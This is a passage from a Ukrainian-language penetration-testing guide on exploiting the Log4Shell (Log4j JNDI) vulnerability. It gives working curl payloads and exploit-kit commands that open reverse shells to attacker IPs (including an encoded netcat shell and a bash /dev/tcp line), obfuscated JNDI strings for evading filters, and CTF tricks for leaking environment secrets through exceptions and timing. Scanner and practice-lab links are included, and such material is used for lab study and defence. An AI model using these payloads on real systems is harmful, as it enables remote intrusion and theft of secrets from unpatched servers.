–í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤—Å—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. –î–µ—è–∫—ñ –∫–æ—Ä–∏—Å–Ω—ñ –∑ –Ω–∏—Ö:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
–û—Ç–∂–µ, –≤ –Ω–∞—à–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –º–∏ –≤–∂–µ –º–∞—î–º–æ –∑–∞–ø—É—â–µ–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –¥–æ–¥–∞—Ç–æ–∫ docker. –©–æ–± –∞—Ç–∞–∫—É–≤–∞—Ç–∏ –π–æ–≥–æ:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
–ö–æ–ª–∏ –≤–∏ –Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ –∞—Ç–∞–∫–∏, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –¥–µ—è–∫—ñ –≤–∏—Ö–æ–¥–∏ –≤ —Ç–µ—Ä–º—ñ–Ω–∞–ª—ñ, –¥–µ –≤–∏ –≤–∏–∫–æ–Ω–∞–ª–∏ **JNDIExploit-1.2-SNAPSHOT.jar**.

**–ù–µ –∑–∞–±—É–¥—å—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` –¥–ª—è —ñ–Ω—à–∏—Ö –≤–∞—Ä—ñ–∞–Ω—Ç—ñ–≤ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —É —Ä–∞–∑—ñ –ø–æ—Ç—Ä–µ–±–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –ø–æ—Ä—Ç LDAP —Ç–∞ HTTP —Å–µ—Ä–≤–µ—Ä—ñ–≤.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

–ü–æ–¥—ñ–±–Ω–æ –¥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ.\
–í–∏ –º–æ–∂–µ—Ç–µ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ URL-–∞–¥—Ä–µ—Å–∏ –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –∂–µ—Ä—Ç–≤—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_–¶—è –∞—Ç–∞–∫–∞, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π java-–æ–±'—î–∫—Ç, –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –≤ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ—è—Ö, —Ç–∞–∫–∏—Ö —è–∫ **THM solar room**. –û–¥–Ω–∞–∫, —Ü–µ –∑–∞–∑–≤–∏—á–∞–π –Ω–µ —Å–ø—Ä–∞—Ü—é—î (–æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Java –Ω–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –∫–æ–¥—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é LDAP), —è –¥—É–º–∞—é, —Ç–æ–º—É —â–æ —Ü–µ –Ω–µ –∑–ª–æ–≤–∂–∏–≤–∞—î –¥–æ–≤—ñ—Ä–µ–Ω–æ—é –∫–ª–∞—Å–æ—é –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) - —Ü–µ —â–µ –æ–¥–∏–Ω —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **—Ä–æ–±–æ—á–∏—Ö JNDI –ø–æ—Å–∏–ª–∞–Ω—å** —Ç–∞ –Ω–∞–¥–∞–Ω–Ω—è —Ñ–æ–Ω–æ–≤–∏—Ö –ø–æ—Å–ª—É–≥ —à–ª—è—Ö–æ–º –∑–∞–ø—É—Å–∫—É RMI —Å–µ—Ä–≤–µ—Ä–∞, LDAP —Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞ HTTP —Å–µ—Ä–≤–µ—Ä–∞.\

### RCE - ysoserial & JNDI-Exploit-Kit

–¶–µ–π –≤–∞—Ä—ñ–∞–Ω—Ç –¥—ñ–π—Å–Ω–æ –∫–æ—Ä–∏—Å–Ω–∏–π –¥–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ **–≤–µ—Ä—Å—ñ—ó Java, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ –¥–æ–≤—ñ—Ä—É –ª–∏—à–µ –¥–æ –≤–∫–∞–∑–∞–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤, –∞ –Ω–µ –¥–æ –≤—Å—ñ—Ö**. –¢–æ–º—É **ysoserial** –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π –¥–æ–≤—ñ—Ä–µ–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤**, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ —è–∫ –≥–∞–¥–∂–µ—Ç–∏ –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É** (_–¥–æ–≤—ñ—Ä–µ–Ω–∞ –∫–ª–∞—Å, —è–∫–æ—é –∑–ª–æ–≤–∂–∏–≤–∞—î ysoserial, –ø–æ–≤–∏–Ω–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –∂–µ—Ä—Ç–≤–æ—é java –ø—Ä–æ–≥—Ä–∞–º–∏, —â–æ–± –µ–∫—Å–ø–ª–æ–π—Ç —Å–ø—Ä–∞—Ü—é–≤–∞–≤_).

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **ysoserial** –∞–±–æ [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified), –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫—Å–ø–ª–æ–π—Ç –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —è–∫–∏–π –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **JNDI –ø–æ—Å–∏–ª–∞–Ω—å**, –¥–µ –µ–∫—Å–ø–ª–æ–π—Ç –±—É–¥–µ —á–µ–∫–∞—Ç–∏ –Ω–∞ –∑'—î–¥–Ω–∞–Ω–Ω—è –≤—ñ–¥ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –º–∞—à–∏–Ω. –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥–∞–≤–∞—Ç–∏ **—Ä—ñ–∑–Ω—ñ –µ–∫—Å–ø–ª–æ–π—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ** JNDI-Exploit-Kit –∞–±–æ –Ω–∞–≤—ñ—Ç—å —Å–≤–æ—ó **–≤–ª–∞—Å–Ω—ñ –≤–∞–Ω—Ç–∞–∂—ñ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó** (–∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ –≤–∞–º–∏ –∞–±–æ ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

–¢–µ–ø–µ—Ä –≤–∏ –º–æ–∂–µ—Ç–µ –ª–µ–≥–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è JNDI –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ **—Ä–µ–≤–µ—Ä—Å-—à–µ–ª–ª**, –ø—Ä–æ—Å—Ç–æ –Ω–∞–¥—ñ—Å–ª–∞–≤—à–∏ –π–æ–≥–æ –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—É –≤–µ—Ä—Å—ñ—é log4j: **`${ldap://10.10.14.10:1389/generated}`**

### –û–±—Ö–æ–¥–∏
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω—ñ —Å–∫–∞–Ω–µ—Ä–∏

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - –ó–Ω–∞–π—Ç–∏ –ª–æ–∫–∞–ª—å–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏

### –õ–∞–±–æ—Ä–∞—Ç–æ—Ä—ñ—ó –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è

* [**LogForge HTB machine**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## –ü—ñ—Å–ª—è–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è Log4Shell

–£ —Ü—å–æ–º—É [**CTF –∑–≤—ñ—Ç—ñ**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) –¥–æ–±—Ä–µ –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —è–∫ —Ü–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ **–º–æ–∂–ª–∏–≤–æ** **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** –¥–µ—è–∫–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏ **Log4J**.

[**–°—Ç–æ—Ä—ñ–Ω–∫–∞ –±–µ–∑–ø–µ–∫–∏**](https://logging.apache.org/log4j/2.x/security.html) Log4j –º—ñ—Å—Ç–∏—Ç—å –∫—ñ–ª—å–∫–∞ —Ü—ñ–∫–∞–≤–∏—Ö —Ä–µ—á–µ–Ω—å:

> –ó –≤–µ—Ä—Å—ñ—ó 2.16.0 (–¥–ª—è Java 8), **—Ñ—É–Ω–∫—Ü—ñ—è –ø–æ—à—É–∫—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –±—É–ª–∞ –ø–æ–≤–Ω—ñ—Å—Ç—é –≤–∏–¥–∞–ª–µ–Ω–∞**. **–ü–æ—à—É–∫–∏ –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –≤—Å–µ —â–µ –ø—Ä–∞—Ü—é—é—Ç—å**. –ö—Ä—ñ–º —Ç–æ–≥–æ, Log4j —Ç–µ–ø–µ—Ä –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤—ñ–¥–∫–ª—é—á–∞—î –¥–æ—Å—Ç—É–ø –¥–æ JNDI. –ü–æ—à—É–∫–∏ JNDI –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–µ–ø–µ—Ä –ø–æ—Ç—Ä—ñ–±–Ω–æ —è–≤–Ω–æ –≤–∫–ª—é—á–∞—Ç–∏.

> –ó –≤–µ—Ä—Å—ñ—ó 2.17.0 (—ñ 2.12.3 —Ç–∞ 2.3.1 –¥–ª—è Java 7 —ñ Java 6), **—Ç—ñ–ª—å–∫–∏ —Ä—è–¥–∫–∏ –ø–æ—à—É–∫—É –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ä–æ–∑—à–∏—Ä—é—é—Ç—å—Å—è —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ**; –≤ –±—É–¥—å-—è–∫–æ–º—É —ñ–Ω—à–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ –ª–∏—à–µ –≤–µ—Ä—Ö–Ω—ñ–π —Ä—ñ–≤–µ–Ω—å –ø–æ—à—É–∫—É –≤–∏—Ä—ñ—à—É—î—Ç—å—Å—è, –∞ –±—É–¥—å-—è–∫—ñ –≤–∫–ª–∞–¥–µ–Ω—ñ –ø–æ—à—É–∫–∏ –Ω–µ –≤–∏—Ä—ñ—à—É—é—Ç—å—Å—è.

–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–±—É—Ç–∏ –ø—Ä–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±—É–¥—å-—è–∫–æ–≥–æ –µ–∫—Å–ø–ª–æ–π—Ç—É `jndi`**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ **—Ä–µ–∫—É—Ä—Å–∏–≤–Ω—ñ –ø–æ—à—É–∫–∏**, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —ó—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —É —Ü—å–æ–º—É CTF —Ü–µ –±—É–ª–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ —É —Ñ–∞–π–ª—ñ log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

–£ [—Ü—å–æ–º—É CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) –∞—Ç–∞–∫—É—é—á–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞–≤ –∑–Ω–∞—á–µ–Ω–Ω—è `${sys:cmd}` —ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–ª–æ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –ø—Ä–∞–ø–æ—Ä –∑ –∑–º—ñ–Ω–Ω–æ—ó —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞.\
–Ø–∫ –≤–∏–¥–Ω–æ –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤ [**–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö payloads**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), —î –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ –¥–æ—Å—Ç—É–ø—É –¥–æ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞, —Ç–∞–∫–∏—Ö —è–∫: **`${env:FLAG}`**. –£ —Ü—å–æ–º—É CTF —Ü–µ –±—É–ª–æ –º–∞—Ä–Ω–æ, –∞–ª–µ –≤ —ñ–Ω—à–∏—Ö —Ä–µ–∞–ª—å–Ω–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–æ.

### Exfiltration in Exceptions

–£ CTF –≤–∏ **–Ω–µ –º–æ–≥–ª–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ stderr** java-–¥–æ–¥–∞—Ç–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ log4J, –∞–ª–µ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è Log4J **–Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –¥–æ stdout**, —â–æ –±—É–ª–æ –Ω–∞–¥—Ä—É–∫–æ–≤–∞–Ω–æ –≤ python-–¥–æ–¥–∞—Ç–∫—É. –¶–µ –æ–∑–Ω–∞—á–∞–ª–æ, —â–æ, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è, –º–∏ –º–æ–≥–ª–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–º—ñ—Å—Ç—É. –í–∏–∫–ª—é—á–µ–Ω–Ω—è –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –ø—Ä–∞–ø–æ—Ä–∞ –±—É–ª–æ: **`${java:${env:FLAG}}`.** –¶–µ –ø—Ä–∞—Ü—é—î, —Ç–æ–º—É —â–æ **`${java:CTF{blahblah}}`** –Ω–µ —ñ—Å–Ω—É—î, —ñ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è –∑ –∑–Ω–∞—á–µ–Ω–Ω—è–º –ø—Ä–∞–ø–æ—Ä–∞ –±—É–¥–µ –ø–æ–∫–∞–∑–∞–Ω–æ:

![](<../../.gitbook/assets/image (1023).png>)

### Conversion Patterns Exceptions

–ü—Ä–æ—Å—Ç–æ —â–æ–± –∑–≥–∞–¥–∞—Ç–∏, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–≥–ª–∏ –± —ñ–Ω–∂–µ–∫—Ç—É–≤–∞—Ç–∏ –Ω–æ–≤—ñ [**conversion patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–ø–∏—Å–∞–Ω—ñ –≤ `stdout`. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:

![](<../../.gitbook/assets/image (683).png>)

–¶–µ –Ω–µ –±—É–ª–æ –≤–∏–∑–Ω–∞–Ω–æ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–∞–ø–∏—Ç –Ω–µ –±—É–≤ –≤–∏—Ä—ñ—à–µ–Ω–∏–π –¥–æ —à–∞–±–ª–æ–Ω—É –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è, –∞–ª–µ —Ü–µ –º–æ–≥–ª–æ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è —ñ–Ω—à–∏—Ö —Ä–µ—á–µ–π, —Ç–∞–∫–∏—Ö —è–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

### Conversion Patterns Regexes

–û–¥–Ω–∞–∫ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ **conversion patterns, —è–∫—ñ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å regexes**, –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ –∑–∞–ø–∏—Ç—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ regexes —ñ –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ **–±—ñ–Ω–∞—Ä–Ω–∏–º –ø–æ—à—É–∫–æ–º** –∞–±–æ **—á–∞—Å–æ–≤–∏–º–∏** –ø–æ–≤–µ–¥—ñ–Ω–∫–∞–º–∏.

* **–ë—ñ–Ω–∞—Ä–Ω–∏–π –ø–æ—à—É–∫ —á–µ—Ä–µ–∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è**

–®–∞–±–ª–æ–Ω –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è **`%replace`** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è **–∑–∞–º—ñ–Ω–∏** **–≤–º—ñ—Å—Ç—É** –∑ **—Ä—è–¥–∫–∞**, –Ω–∞–≤—ñ—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **regexes**. –¶–µ –ø—Ä–∞—Ü—é—î —Ç–∞–∫: `replace{pattern}{regex}{substitution}`\
–ó–ª–æ–≤–∂–∏–≤–∞—é—á–∏ —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, –≤–∏ –º–æ–≥–ª–∏ –± –∑–º—É—Å–∏—Ç–∏ –∑–∞–º—ñ–Ω—É **–≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è, —è–∫—â–æ regex –∑–±—ñ–≥–∞–≤—Å—è** –∑ —á–∏–º–æ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ä—è–¥–∫–∞ (—ñ –±–µ–∑ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è, —è–∫—â–æ –Ω–µ –±—É–ª–æ –∑–Ω–∞–π–¥–µ–Ω–æ) –æ—Å—å —Ç–∞–∫:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **–ß–∞—Å–æ–≤–∏–π –º–µ—Ç–æ–¥**

–Ø–∫ –±—É–ª–æ –∑–≥–∞–¥–∞–Ω–æ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, **`%replace`** –ø—ñ–¥—Ç—Ä–∏–º—É—î **regexes**. –¢–æ–º—É –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ payload –∑ [**ReDoS —Å—Ç–æ—Ä—ñ–Ω–∫–∏**](../regular-expression-denial-of-service-redos.md), —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **—Ç–∞–π–º-–∞—É—Ç**, —è–∫—â–æ –ø—Ä–∞–ø–æ—Ä –∑–Ω–∞–π–¥–µ–Ω–æ.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, payload –Ω–∞ –∫—à—Ç–∞–ª—Ç `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` –≤–∏–∫–ª–∏–∫–∞–≤ –±–∏ **—Ç–∞–π–º-–∞—É—Ç** –≤ —Ü—å–æ–º—É CTF.

–£ —Ü—å–æ–º—É [**–æ–ø–∏—Å—ñ**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ ReDoS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏ **–∞—Ç–∞–∫–∞ –ø–æ—Å–∏–ª–µ–Ω–Ω—è**, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ä—ñ–∑–Ω–∏—Ü—é –≤ —á–∞—Å—ñ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
